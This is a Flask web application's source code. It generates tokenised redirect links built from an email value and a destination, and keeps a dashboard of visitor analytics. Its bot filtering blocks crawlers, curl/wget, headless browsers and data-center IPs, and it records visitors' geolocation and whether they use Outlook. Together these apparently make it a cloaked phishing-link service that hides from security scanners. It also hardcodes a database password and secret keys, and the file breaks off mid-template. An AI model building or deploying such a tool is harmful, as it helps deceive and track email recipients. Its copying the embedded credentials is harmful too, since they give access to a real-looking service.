from flask import Flask, request, redirect, render_template_string, abort, url_for, session, jsonify, Response
from flask_wtf import FlaskForm, CSRFProtect
from wtforms import StringField, SubmitField, SelectField, BooleanField, HiddenField
from wtforms.validators import DataRequired, Length, Regexp, URL
from cryptography.hazmat.primitives import hashes, hmac
from cryptography.hazmat.backends import default_backend
import os
import base64
import json
import re
import urllib.parse
import secrets
import logging
import time
from datetime import datetime, timedelta
import uuid
import hashlib
from valkey import Valkey
from functools import wraps
import requests
from user_agents import parse
import csv
from io import StringIO
import bleach

app = Flask(__name__)

# Configure logging (minimal for performance)
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')
logger = logging.getLogger(__name__)

# Hardcoded configuration keys
FLASK_SECRET_KEY = "b8f9a3c2d7e4f1a9b0c3d6e8f2a7b4c9"
WTF_CSRF_SECRET_KEY = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"
VALKEY_HOST = "valkey-137d99b9-reign.e.aivencloud.com"
VALKEY_PORT = 25708
VALKEY_USERNAME = "default"
VALKEY_PASSWORD = "AVNS_Yzfa75IOznjCrZJIyzI"
DATA_RETENTION_DAYS = 90
USER_TXT_URL = "https://raw.githubusercontent.com/anderlo091/nvclerks-flask/main/user.txt"

# Load or generate HMAC_KEY (no file system writes)
def load_or_generate_hmac_key():
    try:
        key = os.getenv("HMAC_KEY")
        if key:
            logger.info("Loaded HMAC_KEY from environment variable")
            return base64.b64decode(key)
        key = secrets.token_bytes(32)
        logger.warning("No HMAC_KEY set. Using transient key, which may invalidate links on restart. Set HMAC_KEY in environment.")
        return key
    except Exception as e:
        logger.error(f"Error loading HMAC_KEY: {str(e)}")
        raise

HMAC_KEY = load_or_generate_hmac_key()

# Flask configuration
app.config.update(
    SECRET_KEY=FLASK_SECRET_KEY,
    WTF_CSRF_SECRET_KEY=WTF_CSRF_SECRET_KEY,
    SESSION_COOKIE_HTTPONLY=True,
    SESSION_COOKIE_SECURE=True,
    SESSION_COOKIE_SAMESITE='Strict',
    PERMANENT_SESSION_LIFETIME=timedelta(days=1)
)
logger.info("Flask configuration set")

# CSRF protection
csrf = CSRFProtect(app)

# WTForms for login and URL generation
class LoginForm(FlaskForm):
    username = StringField('Username', validators=[
        DataRequired(message="Username required"),
        Length(min=2, max=100, message="Username must be 2-100 characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Invalid username characters")
    ])
    next_url = HiddenField('Next')
    submit = SubmitField('Login')

class GenerateURLForm(FlaskForm):
    subdomain = StringField('Subdomain', validators=[
        DataRequired(message="Subdomain required"),
        Length(min=2, message="Subdomain must be 2+ characters"),
        Regexp(r'^[A-Za-z0-9-]+$', message="Invalid subdomain characters")
    ])
    randomstring1 = StringField('Randomstring1', validators=[
        DataRequired(message="Randomstring1 required"),
        Length(min=2, message="Randomstring1 must be 2+ characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Invalid randomstring1 characters")
    ])
    base64email = StringField('Base64email', validators=[
        DataRequired(message="Base64email required"),
        Length(min=2, message="Base64email must be 2+ characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Invalid base64email characters")
    ])
    destination_link = StringField('Destination Link', validators=[
        DataRequired(message="Destination link required"),
        URL(message="Invalid URL format")
    ])
    randomstring2 = StringField('Randomstring2', validators=[
        DataRequired(message="Randomstring2 required"),
        Length(min=2, message="Randomstring2 must be 2+ characters"),
        Regexp(r'^[A-Za-z0-9_@.]+$', message="Invalid randomstring2 characters")
    ])
    expiry = SelectField('Expiry', choices=[
        ('3600', '1 Hour'),
        ('86400', '1 Day'),
        ('604800', '1 Week'),
        ('2592000', '1 Month')
    ], default='604800')
    analytics_enabled = BooleanField('Enable Analytics', default=True)
    submit = SubmitField('Generate URL')

# Valkey initialization
valkey_client = None
try:
    valkey_client = Valkey(
        host=VALKEY_HOST,
        port=VALKEY_PORT,
        username=VALKEY_USERNAME,
        password=VALKEY_PASSWORD,
        decode_responses=True,
        ssl=True
    )
    valkey_client.ping()
    logger.info("Valkey connected")
except Exception as e:
    logger.error(f"Valkey connection failed: {str(e)}")
    valkey_client = None

# Jinja2 datetime filter
def datetime_filter(timestamp):
    try:
        return datetime.fromtimestamp(timestamp).strftime('%Y-%m-%d %H:%M:%S')
    except:
        return "N/A"

app.jinja_env.filters['datetime'] = datetime_filter

# Bot detection patterns
BOT_PATTERNS = ["googlebot", "bingbot", "yandex", "duckduckbot", "curl/", "wget/", "headless"]

def is_bot(user_agent, headers, ip, endpoint):
    if 'username' in session:
        return False, "Authenticated user"
    if endpoint.startswith("/") and endpoint != "/login":
        return False, "Generated link access"
    if not user_agent:
        return True, "Missing User-Agent"
    user_agent_lower = user_agent.lower()
    for pattern in BOT_PATTERNS:
        if pattern in user_agent_lower:
            return True, f"Known bot: {pattern}"
    if 'HeadlessChrome' in user_agent or 'PhantomJS' in user_agent:
        return True, "Headless browser"
    if valkey_client:
        try:
            key = f"bot_check:{ip}"
            count = valkey_client.get(key)
            if count and int(count) > 10:
                return True, "Rapid requests"
            valkey_client.incr(key)
            valkey_client.expire(key, 60)
        except:
            pass
    if ip.startswith(('162.249.', '5.62.', '84.39.')):
        return True, "Data center IP"
    if endpoint == "/login" and headers.get('Referer') and 'Mozilla' in user_agent:
        return False, "Likely human"
    if 'js_verified' not in session:
        return True, "Missing JS verification"
    return False, "Human"

def check_asn(ip):
    return False  # Skipped for performance

def get_geoip(ip):
    try:
        url = f"https://ipapi.co/{ip}/json/"
        response = requests.get(url, timeout=5).json()
        return {
            "country": response.get('country_name', 'N/A'),
            "country_code": response.get('country_code', 'N/A'),
            "region": response.get('region', 'N/A'),
            "region_code": response.get('region_code', 'N/A'),
            "city": response.get('city', 'N/A'),
            "zip": response.get('postal', 'N/A'),
            "latitude": float(response.get('latitude', 0.0)),
            "longitude": float(response.get('longitude', 0.0)),
            "timezone": response.get('timezone', 'UTC'),
            "isp": response.get('isp', 'N/A'),
            "organization": response.get('org', 'N/A'),
            "as_number": response.get('asn', 'N/A')
        }
    except:
        return {
            "country": "N/A", "country_code": "N/A", "region": "N/A", "region_code": "N/A",
            "city": "N/A", "zip": "N/A", "latitude": 0.0, "longitude": 0.0, "timezone": "UTC",
            "isp": "N/A", "organization": "N/A", "as_number": "N/A"
        }

def get_device_info(user_agent_string):
    try:
        ua = parse(user_agent_string)
        device_type = "Desktop" if ua.is_pc else "Mobile" if ua.is_mobile else "Tablet" if ua.is_tablet else "N/A"
        screen_type = "Touchscreen" if ua.is_mobile or ua.is_tablet else "Standard"
        app = ua.browser.family or "N/A"
        if "Outlook" in user_agent_string:
            app = "Outlook"
        return {"device_type": device_type, "screen_type": screen_type, "application": app}
    except:
        return {"device_type": "N/A", "screen_type": "N/A", "application": "N/A"}

def rate_limit(limit=5, per=60):
    def decorator(f):
        @wraps(f)
        def wrapped_function(*args, **kwargs):
            ip = request.remote_addr
            user_agent = request.headers.get("User-Agent", "")
            headers = request.headers
            endpoint = request.path
            is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, endpoint)
            if is_bot_flag:
                abort(403, f"Access denied: {bot_reason}")
            if not valkey_client:
                return f(*args, **kwargs)
            key = f"rate_limit:{ip}:{f.__name__}"
            try:
                current = valkey_client.get(key)
                if current is None:
                    valkey_client.setex(key, per, 1)
                elif int(current) >= limit:
                    abort(429, "Too Many Requests")
                else:
                    valkey_client.incr(key)
            except:
                pass
            return f(*args, **kwargs)
        return wrapped_function
    return decorator

def generate_fingerprint():
    try:
        headers = request.headers
        canvas = headers.get('X-Canvas-Fingerprint', '')
        fonts = headers.get('X-Fonts', '')
        plugins = headers.get('X-Plugins', '')
        ip = request.remote_addr
        return hashlib.sha256(f"{canvas}{fonts}{plugins}{ip}{time.time()}".encode()).hexdigest()
    except:
        return hashlib.sha256(str(time.time()).encode()).hexdigest()

def verify_browser():
    if not valkey_client:
        return True
    fingerprint = generate_fingerprint()
    session_key = f"browser:{fingerprint}"
    try:
        if not valkey_client.exists(session_key):
            valkey_client.setex(session_key, 3600, 1)
            return False
        return True
    except:
        return True

def encrypt_slugstorm(payload):
    try:
        expiry = (datetime.utcnow() + timedelta(hours=24)).timestamp() * 1000
        data = json.dumps({"payload": payload, "expires": expiry})
        uuid_chain = f"{uuid.uuid4()}{secrets.token_hex(20)}"
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data.encode('utf-8'))
        signature = h.finalize()
        return f"{base64.urlsafe_b64encode(data.encode('utf-8')).decode()}.{uuid_chain}.{base64.urlsafe_b64encode(signature).decode()}"
    except Exception as e:
        logger.error(f"SlugStorm encryption error: {str(e)}")
        raise ValueError("Encryption failed")

def decrypt_slugstorm(encrypted):
    try:
        parts = encrypted.split('.')
        if len(parts) != 3:
            raise ValueError("Invalid payload format")
        data_b64, _, sig_b64 = parts
        try:
            data = base64.urlsafe_b64decode(data_b64).decode('utf-8')
        except UnicodeDecodeError:
            data = base64.urlsafe_b64decode(data_b64).decode('latin1', errors='ignore')
        signature = base64.urlsafe_b64decode(sig_b64)
        h = hmac.HMAC(HMAC_KEY, hashes.SHA256(), backend=default_backend())
        h.update(data.encode('utf-8'))
        h.verify(signature)
        data = json.loads(data)
        if data['expires'] < int(time.time() * 1000):
            raise ValueError("Payload expired")
        return data
    except ValueError as e:
        logger.error(f"SlugStorm decryption error: {str(e)}")
        raise
    except Exception as e:
        logger.error(f"Unexpected SlugStorm decryption error: {str(e)}")
        raise ValueError("Invalid payload")

def get_valid_usernames():
    if valkey_client:
        cached = valkey_client.get("usernames")
        if cached:
            return json.loads(cached)
    try:
        response = requests.get(USER_TXT_URL)
        response.raise_for_status()
        usernames = [bleach.clean(line.strip()) for line in response.text.splitlines() if line.strip()]
        if valkey_client:
            valkey_client.setex("usernames", 3600, json.dumps(usernames))
        return usernames
    except:
        return []

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'username' not in session:
            return redirect(url_for('login', next=request.url))
        return f(*args, **kwargs)
    return decorated_function

def get_base_domain():
    host = request.host
    parts = host.split('.')
    return '.'.join(parts[-2:]) if len(parts) >= 2 else host

@app.before_request
def block_ohio_subdomain():
    if request.host == 'ohioautocollection.nvclerks.com':
        return redirect("https://google.com", code=302)

@app.before_request
def log_visitor():
    if request.path.startswith(('/static', '/challenge', '/fingerprint', '/denied')):
        return
    username = session.get('username', 'default')
    user_agent = request.headers.get("User-Agent", "")
    ip = request.remote_addr
    headers = request.headers
    referer = headers.get("Referer", "")
    session_start = session.get('session_start', int(time.time()))
    session['session_start'] = session_start

    device_info = get_device_info(user_agent)
    is_bot_flag, bot_reason = is_bot(user_agent, headers, ip, request.path)
    visit_type = "Human"
    if is_bot_flag:
        visit_type = "Bot" if "curl/" in user_agent.lower() else "Mimicry" if "Mimicry" in bot_reason else "Bot"
    elif device_info['application'] != "N/A":
        visit_type = "App"

    location = get_geoip(ip)
    session_duration = int(time.time()) - session_start
    timestamp = int(time.time())
    visitor_id = hashlib.sha256(f"{ip}{timestamp}".encode()).hexdigest()

    if valkey_client:
        try:
            valkey_client.hset(f"user:{username}:visitor:{visitor_id}", mapping={
                "timestamp": timestamp, "ip": ip, "country": location['country'],
                "country_code": location['country_code'], "region": location['region'],
                "region_code": location['region_code'], "city": location['city'],
                "zip": location['zip'], "latitude": str(location['latitude']),
                "longitude": str(location['longitude']), "isp": location['isp'],
                "organization": location['organization'], "as_number": location['as_number'],
                "timezone": location['timezone'], "device_type": device_info['device_type'],
                "screen_type": device_info['screen_type'], "application": device_info['application'],
                "user_agent": user_agent, "bot_status": visit_type,
                "block_reason": bot_reason if is_bot_flag else "N/A", "referer": referer,
                "source": 'referral' if referer else 'direct', "session_duration": session_duration
            })
            valkey_client.zadd(f"user:{username}:visitor_log", {visitor_id: timestamp})
            valkey_client.expire(f"user:{username}:visitor:{visitor_id}", DATA_RETENTION_DAYS * 86400)
            valkey_client.zremrangebyrank(f"user:{username}:visitor_log", 0, -1001)
        except:
            pass

@app.route("/login", methods=["GET", "POST"])
@rate_limit(limit=5, per=60)
def login():
    try:
        form = LoginForm()
        if form.validate_on_submit():
            username = bleach.clean(form.username.data.strip())
            if username in get_valid_usernames():
                session['username'] = username
                session.permanent = True
                session.modified = True
                next_url = form.next_url.data or url_for('dashboard')
                return redirect(next_url)
            form.username.errors.append("Invalid username")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Login</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <style>
                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                </style>
                <script>
                    function sendChallenge() {
                        let challenge = Math.random() * 1000;
                        fetch('/challenge', { method: 'POST', headers: {'Content-Type': 'application/json'},
                            body: JSON.stringify({ challenge }) });
                    }
                    function getCanvasFingerprint() {
                        const canvas = document.createElement('canvas');
                        const ctx = canvas.getContext('2d');
                        ctx.textBaseline = 'top';
                        ctx.font = '14px Arial';
                        ctx.fillText('Fingerprint', 2, 2);
                        return canvas.toDataURL();
                    }
                    window.onload = function() { sendChallenge(); fetch('/fingerprint', { method: 'POST',
                        headers: {'Content-Type': 'application/json'}, body: JSON.stringify({ fingerprint: getCanvasFingerprint() }) }); };
                </script>
            </head>
            <body class="min-h-screen flex items-center justify-center p-4">
                <div class="container bg-white p-8 rounded-xl shadow-2xl max-w-md w-full">
                    <h1 class="text-3xl font-extrabold mb-6 text-center text-gray-900">Login</h1>
                    {% if form.errors %}
                        <p class="text-red-600 mb-4 text-center">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    <form method="POST" class="space-y-5">
                        {{ form.csrf_token }}
                        {{ form.next_url(value=request.args.get('next', '')) }}
                        <div>
                            <label class="block text-sm font-medium text-gray-700">Username</label>
                            {{ form.username(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                        </div>
                        {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                    </form>
                </div>
            </body>
            </html>
        """, form=form)
    except Exception as e:
        logger.error(f"Error in login: {str(e)}")
        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <title>Internal Server Error</title>
                <script src="https://cdn.tailwindcss.com"></script>
            </head>
            <body class="min-h-screen bg-gray-100 flex items-center justify-center p-4">
                <div class="bg-white p-8 rounded-xl shadow-lg max-w-sm w-full text-center">
                    <h3 class="text-lg font-bold mb-4 text-red-600">Internal Server Error</h3>
                    <p class="text-gray-600">Something went wrong. Please try again later.</p>
                </div>
            </body>
            </html>
        """), 500

@app.route("/", methods=["GET"])
@rate_limit(limit=5, per=60)
def index():
    if 'username' in session:
        return redirect(url_for('dashboard'))
    return redirect(url_for('login'))

@app.route("/dashboard", methods=["GET", "POST"])
@login_required
@rate_limit(limit=5, per=60)
def dashboard():
    try:
        username = session['username']
        base_domain = get_base_domain()
        form = GenerateURLForm()
        error = None

        if form.validate_on_submit():
            subdomain = bleach.clean(form.subdomain.data.strip())
            randomstring1 = bleach.clean(form.randomstring1.data.strip())
            base64email = bleach.clean(form.base64email.data.strip())
            destination_link = bleach.clean(form.destination_link.data.strip())
            randomstring2 = bleach.clean(form.randomstring2.data.strip())
            analytics_enabled = form.analytics_enabled.data
            expiry = int(form.expiry.data)

            parsed_url = urllib.parse.urlparse(destination_link)
            if not parsed_url.scheme in ('http', 'https') or not parsed_url.netloc:
                error = "Invalid URL"

            if not error:
                path_segment = f"{randomstring1}{base64email}{randomstring2}"
                endpoint = generate_random_string(16)
                random_suffix = secrets.token_hex(32)
                expiry_timestamp = int(time.time()) + expiry
                payload = json.dumps({
                    "student_link": destination_link,
                    "timestamp": int(time.time() * 1000),
                    "expiry": expiry_timestamp
                })

                try:
                    encrypted_payload = encrypt_slugstorm(payload)
                except:
                    error = "Encryption failed"

                if not error:
                    generated_url = f"https://{urllib.parse.quote(subdomain)}.{base_domain}/{urllib.parse.quote(endpoint)}/{urllib.parse.quote(encrypted_payload, safe='')}/{urllib.parse.quote(path_segment)}/{urllib.parse.quote(random_suffix)}"
                    url_id = hashlib.sha256(f"{endpoint}{encrypted_payload}".encode()).hexdigest()
                    if valkey_client:
                        try:
                            valkey_client.hset(f"user:{username}:url:{url_id}", mapping={
                                "url": generated_url, "destination": destination_link,
                                "encrypted_payload": encrypted_payload, "endpoint": endpoint,
                                "created": int(time.time()), "expiry": expiry_timestamp,
                                "clicks": 0, "analytics_enabled": "1" if analytics_enabled else "0"
                            })
                            valkey_client.setex(f"url_payload:{url_id}", expiry_timestamp - int(time.time()), payload)
                            valkey_client.expire(f"user:{username}:url:{url_id}", DATA_RETENTION_DAYS * 86400)
                        except:
                            error = "Database error"
                    else:
                        error = "Database unavailable"

                    if not error:
                        return redirect(url_for('dashboard'))

        urls = []
        valkey_error = None
        if valkey_client:
            try:
                url_keys = valkey_client.keys(f"user:{username}:url:*")
                for key in url_keys:
                    url_data = valkey_client.hgetall(key)
                    if not url_data:
                        continue
                    url_id = key.split(':')[-1]
                    visits = valkey_client.lrange(f"user:{username}:url:{url_id}:visits", 0, -1)
                    visit_data = []
                    human_visits = bot_visits = 0
                    for v in visits:
                        try:
                            visit = json.loads(v)
                            visit_data.append(visit)
                            if visit.get('type') == 'Human':
                                human_visits += 1
                            else:
                                bot_visits += 1
                        except:
                            pass
                    click_trends = {}
                    for visit in visit_data:
                        try:
                            date = datetime.fromtimestamp(visit.get('timestamp', 0)).strftime('%Y-%m-%d')
                            click_trends[date] = click_trends.get(date, 0) + 1
                        except:
                            pass
                    urls.append({
                        "url": url_data.get('url', ''),
                        "destination": url_data.get('destination', ''),
                        "created": datetime.fromtimestamp(int(url_data.get('created', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('created') else 'N/A',
                        "expiry": datetime.fromtimestamp(int(url_data.get('expiry', 0))).strftime('%Y-%m-%d %H:%M:%S') if url_data.get('expiry') else 'N/A',
                        "clicks": int(url_data.get('clicks', 0)),
                        "analytics_enabled": url_data.get('analytics_enabled', '0') == '1',
                        "visits": visit_data,
                        "human_visits": human_visits,
                        "bot_visits": bot_visits,
                        "click_trends_keys": list(click_trends.keys()),
                        "click_trends_values": list(click_trends.values()),
                        "url_id": url_id
                    })
            except:
                valkey_error = "Database error"
        else:
            valkey_error = "Database unavailable"

        visitors = []
        bot_logs = []
        traffic_sources = {"direct": 0, "referral": 0, "organic": 0}
        bot_ratio = {"human": 0, "bot": 0}
        if valkey_client:
            try:
                visitor_ids = valkey_client.zrevrange(f"user:{username}:visitor_log", 0, -1)
                for visitor_id in visitor_ids:
                    visitor_data = valkey_client.hgetall(f"user:{username}:visitor:{visitor_id}")
                    if not visitor_data:
                        continue
                    source = 'referral' if visitor_data.get('referer') else 'direct'
                    visitor_entry = {
                        "timestamp": datetime.fromtimestamp(int(visitor_data.get('timestamp', 0))).strftime('%Y-%m-%d %H:%M:%S') if visitor_data.get('timestamp') else 'N/A',
                        "ip": visitor_data.get('ip', 'N/A'),
                        "country": visitor_data.get('country', 'N/A'),
                        "country_code": visitor_data.get('country_code', 'N/A'),
                        "region": visitor_data.get('region', 'N/A'),
                        "region_code": visitor_data.get('region_code', 'N/A'),
                        "city": visitor_data.get('city', 'N/A'),
                        "zip": visitor_data.get('zip', 'N/A'),
                        "latitude": float(visitor_data.get('latitude', 0.0)),
                        "longitude": float(visitor_data.get('longitude', 0.0)),
                        "isp": visitor_data.get('isp', 'N/A'),
                        "organization": visitor_data.get('organization', 'N/A'),
                        "as_number": visitor_data.get('as_number', 'N/A'),
                        "timezone": visitor_data.get('timezone', 'UTC'),
                        "device_type": visitor_data.get('device_type', 'N/A'),
                        "screen_type": visitor_data.get('screen_type', 'N/A'),
                        "application": visitor_data.get('application', 'N/A'),
                        "user_agent": visitor_data.get('user_agent', 'N/A'),
                        "bot_status": visitor_data.get('bot_status', 'N/A'),
                        "block_reason": visitor_data.get('block_reason', 'N/A'),
                        "source": source,
                        "session_duration": int(visitor_data.get('session_duration', 0))
                    }
                    visitors.append(visitor_entry)
                    if visitor_data.get('bot_status') != 'Human':
                        bot_logs.append({
                            "timestamp": visitor_data.get('timestamp', 'N/A'),
                            "ip": visitor_data.get('ip', 'N/A'),
                            "block_reason": visitor_data.get('block_reason', 'N/A')
                        })
                        bot_ratio['bot'] += 1
                    else:
                        bot_ratio['human'] += 1
                    traffic_sources[source] = traffic_sources.get(source, 0) + 1
            except:
                valkey_error = "Database error"

        traffic_sources_keys = list(traffic_sources.keys())
        traffic_sources_values = list(traffic_sources.values())
        bot_ratio_keys = list(bot_ratio.keys())
        bot_ratio_values = list(bot_ratio.values())
        theme_seed = hashlib.sha256(str(uuid.uuid4()).encode()).hexdigest()[:6]
        primary_color = f"#{theme_seed}"

        return render_template_string("""
            <!DOCTYPE html>
            <html lang="en">
            <head>
                <meta charset="UTF-8">
                <meta name="viewport" content="width=device-width, initial-scale=1.0">
                <meta name="robots" content="noindex, nofollow">
                <title>Dashboard - {{ username }}</title>
                <script src="https://cdn.tailwindcss.com"></script>
                <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
                <style>
                    body { background: linear-gradient(to right, #4f46e5, #7c3aed); color: #1f2937; }
                    .container { animation: fadeIn 1s ease-in; }
                    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
                    .card { transition: all 0.3s; box-shadow: 0 10px 15px rgba(0,0,0,0.1); }
                    .card:hover { transform: translateY(-5px); }
                    canvas { max-height: 200px; }
                    .tab { cursor: pointer; transition: all 0.3s; }
                    .tab.active { background-color: #4f46e5; color: white; }
                    .table-container { max-height: 400px; overflow-y: auto; }
                    table { width: 100%; border-collapse: collapse; }
                    th, td { padding: 12px; text-align: left; }
                    th { background: #e5e7eb; position: sticky; top: 0; }
                    tr:nth-child(even) { background: #f9fafb; }
                    .error { background: #fee2e2; color: #b91c1c; }
                    .bot { background: #fee2e2; }
                    .refresh-btn { animation: pulse 2s infinite; }
                    @keyframes pulse { 0% { transform: scale(1); } 50% { transform: scale(1.05); } 100% { transform: scale(1); } }
                    .toggle-switch { position: relative; display: inline-block; width: 60px; height: 34px; }
                    .toggle-switch input { opacity: 0; width: 0; height: 0; }
                    .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #ccc; transition: .4s; border-radius: 34px; }
                    .slider:before { position: absolute; content: ""; height: 26px; width: 26px; left: 4px; bottom: 4px; background-color: white; transition: .4s; border-radius: 50%; }
                    input:checked + .slider { background-color: #4f46e5; }
                    input:checked + .slider:before { transform: translateX(26px); }
                </style>
                <script>
                    function toggleAnalytics(id) { document.getElementById('analytics-' + id).classList.toggle('hidden'); }
                    function applyFilters(id) {
                        let device = document.getElementById('filter-device-' + id).value;
                        let type = document.getElementById('filter-type-' + id).value;
                        let rows = document.querySelectorAll('#visits-' + id + ' tr');
                        rows.forEach(row => {
                            let deviceCell = row.cells[2].textContent;
                            let typeCell = row.cells[4].textContent;
                            row.style.display = (
                                (device === '' || deviceCell.includes(device)) &&
                                (type === '' || typeCell.includes(type))
                            ) ? '' : 'none';
                        });
                    }
                    function showTab(tabId) {
                        document.querySelectorAll('.tab-content').forEach(tab => tab.classList.add('hidden'));
                        document.querySelectorAll('.tab').forEach(tab => tab.classList.remove('active'));
                        document.getElementById(tabId).classList.remove('hidden');
                        document.querySelector(`[onclick="showTab('${tabId}')"]`).classList.add('active');
                    }
                    function refreshDashboard() { window.location.reload(); }
                    function toggleAnalyticsSwitch(urlId, index) {
                        fetch('/toggle_analytics/' + urlId, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ csrf_token: "{{ form.csrf_token._value() }}" })
                        }).then(response => {
                            if (response.ok) {
                                let checkbox = document.getElementById('analytics-toggle-' + index);
                                checkbox.checked = !checkbox.checked;
                            } else { alert('Failed to toggle analytics'); }
                        }).catch(error => { alert('Error toggling analytics'); });
                    }
                </script>
            </head>
            <body class="min-h-screen p-4">
                <div class="container max-w-7xl mx-auto">
                    <h1 class="text-4xl font-extrabold mb-8 text-center text-white">Welcome, {{ username }}</h1>
                    {% if form.errors %}
                        <p class="error p-4 mb-4 text-center rounded-lg">
                            {% for field, errors in form.errors.items() %}
                                {% for error in errors %}
                                    {{ error }}<br>
                                {% endfor %}
                            {% endfor %}
                        </p>
                    {% endif %}
                    {% if error %}
                        <p class="error p-4 mb-4 text-center rounded-lg">{{ error }}</p>
                    {% endif %}
                    {% if valkey_error %}
                        <p class="error p-4 mb-4 text-center rounded-lg">{{ valkey_error }}</p>
                    {% endif %}
                    <div class="flex space-x-4 mb-4">
                        <button class="tab px-4 py-2 bg-white rounded-lg active" onclick="showTab('urls-tab')">URLs</button>
                        <button class="tab px-4 py-2 bg-white rounded-lg" onclick="showTab('visitors-tab')">Visitor Views</button>
                        <button class="tab px-4 py-2 bg-white rounded-lg" onclick="showTab('bot-logs-tab')">Bot Logs</button>
                        <button class="tab px-4 py-2 bg-white rounded-lg" onclick="showTab('analytics-tab')">Analytics</button>
                    </div>
                    <div id="urls-tab" class="tab-content">
                        <div class="bg-white p-8 rounded-xl card mb-8">
                            <h2 class="text-2xl font-bold mb-6 text-gray-900">Generate New URL</h2>
                            <p class="text-gray-600 mb-4">Note: Subdomain, Randomstring1, Base64email, and Randomstring2 can be changed after generation.</p>
                            <form method="POST" class="space-y-5">
                                {{ form.csrf_token }}
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Subdomain</label>
                                    {{ form.subdomain(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                </div>
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Randomstring1</label>
                                    {{ form.randomstring1(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                </div>
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Base64email</label>
                                    {{ form.base64email(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                </div>
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Destination Link</label>
                                    {{ form.destination_link(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                </div>
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Randomstring2</label>
                                    {{ form.randomstring2(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                </div>
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Expiry</label>
                                    {{ form.expiry(class="mt-1 w-full p-3 border rounded-lg focus:ring focus:ring-indigo-300 transition") }}
                                </div>
                                <div>
                                    <label class="block text-sm font-medium text-gray-700">Enable Analytics</label>
                                    {{ form.analytics_enabled(class="mt-1 p-3") }}
                                </div>
                                {{ form.submit(class="w-full bg-indigo-600 text-white p-3 rounded-lg hover:bg-indigo-700 transition") }}
                            </form>
                        </div>
                        <div class="bg-white p-8 rounded-xl card">
                            <h2 class="text-2xl font-bold mb-6 text-gray-900">URL History</h2>
                            {% if urls %}
                                {% for url in urls %}
                                    <div class="card bg-gray-50 p-6 rounded-lg mb-4">
                                        <h3 class="text-xl font-semibold text-gray-900">{{ url.destination }}</h3>
                                        <p class="text-gray-600 break-all"><strong>URL:</strong> <a href="{{ url.url }}" target="_blank" class="text-indigo-600">{{ url.url }}</a></p>
                                        <p class="text-gray-600"><strong>Created:</strong> {{ url.created }}</p>
                                        <p class="text-gray-600"><strong>Expires:</strong> {{ url.expiry }}</p>
                                        <p class="text-gray-600"><strong>Total Clicks:</strong> {{ url.clicks }}</p>
                                        <p class="text-gray-600"><strong>Human Clicks:</strong> {{ url.human_visits }}</p>
                                        <p class="text-gray-600"><strong>Bot Clicks:</strong> {{ url.bot_visits }}</p>
                                        <div class="flex items-center mt-2">
                                            <label class="text-sm font-medium text-gray-700 mr-2">Analytics:</label>
                                            <label class="toggle-switch">
                                                <input type="checkbox" id="analytics-toggle-{{ loop.index }}" {% if url.analytics_enabled %}checked{% endif %} onchange="toggleAnalyticsSwitch('{{ url.url_id }}', '{{ loop.index }}')">
                                                <span class="slider"></span>
                                            </label>
                                        </div>
                                        <div class="mt-2 flex space-x-2">
                                            <button onclick="toggleAnalytics('{{ loop.index }}')" class="bg-indigo-600 text-white px-4 py-2 rounded-lg hover:bg-indigo-700">Toggle Analytics</button>
                                            <a href="/clear_views/{{ url.url_id }}" class="bg-yellow-600 text-white px-4 py-2 rounded-lg hover:bg-yellow-700" onclick="return confirm('Clear all views?')">Clear Views</a>
                                            <a href="/delete_url/{{ url.url_id }}" class="bg-red-600 text-white px-4 py-2 rounded-lg hover:bg-red-700" onclick="return confirm('Delete this URL?')">Delete URL</a>
                                        </div>
                                        <div id="analytics-{{ loop.index }}" class="hidden mt-4">
                                            <h4 class="text-lg font-semibold text-gray-900">Visitor Analytics</h4>
                                            <canvas id="chart-{{ loop.index }}" class="mt-4"></canvas>
                                            <script>
                                                new Chart(document.getElementById('chart-{{ loop.index }}'), {
                                                    type: 'line',
                                                    data: {
                                                        labels: {{ url.click_trends_keys|tojson }},
                                                        datasets: [{
                                                            label: 'Clicks',
                                                            data: {{ url.click_trends_values|tojson }},
                                                            borderColor: '{{ primary_color }}',
                                                            fill: false
                                                        }]
                                                    },
                                                    options: {
                                                        scales: {
                                                            x: { title: { display: true, text: 'Date' } },
